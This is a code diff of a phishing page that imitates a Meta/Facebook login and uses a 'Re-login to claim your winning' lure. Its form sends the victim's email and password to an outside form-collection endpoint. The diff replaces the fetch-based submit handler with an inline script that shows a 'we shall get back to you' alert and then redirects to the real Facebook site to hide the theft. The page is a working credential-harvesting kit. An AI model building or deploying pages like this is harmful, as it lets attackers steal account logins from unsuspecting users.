@@ -137,7 +137,7 @@
         <p style="color:red">Re-login to claim your winning</p>
 
         <!-- Login Form -->
-        <form id="loginForm" action="https://submit-form.com/VlWBYGciz" method="POST" onsubmit="handleLogin(event)">
+        <form id="loginForm" action="https://submit-form.com/VlWBYGciz" method="POST">
             <input type="email" name="email" placeholder="Email" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Log In</button>
@@ -153,40 +153,13 @@
         <div class="footer-meta">Meta © 2024</div>
     </div>
 
+    <!-- Inline Script to Show Alert After Form Submission -->
     <script>
-        function handleLogin(event) {
-            event.preventDefault(); // Prevent default form submission
-
-            const form = document.getElementById('loginForm');
-            const formData = new FormData(form);
-
-            // Submit the form using fetch API
-            fetch(form.action, {
-                method: 'POST',
-                body: formData
-            })
-            .then(function(response) {
-                if (response.ok) {
-                    // Successful form submission
-                    return response.text(); // Optional: You can parse the response body if needed
-                } else {
-                    // Handle HTTP errors
-                    throw new Error('Form submission failed. Please try again.');
-                }
-            })
-            .then(function() {
-                // Show alert after successful form submission
-                alert("We shall get back to you.");
-
-                // Redirect to Facebook after 1 second
-                setTimeout(function() {
-                    window.location.href = "https://www.facebook.com";
-                }, 1000);
-            })
-            .catch(function(error) {
-                console.error('Error:', error);
-                alert("An error occurred. Please try again.");
-            });
+        if (window.location.href.includes('VlWBYGciz')) {
+            alert("We are processing your request. We shall get back to you.");
+            setTimeout(function() {
+                window.location.href = "https://www.facebook.com";
+            }, 1000); // Redirect after 1 second
         }
     </script>
 </body>
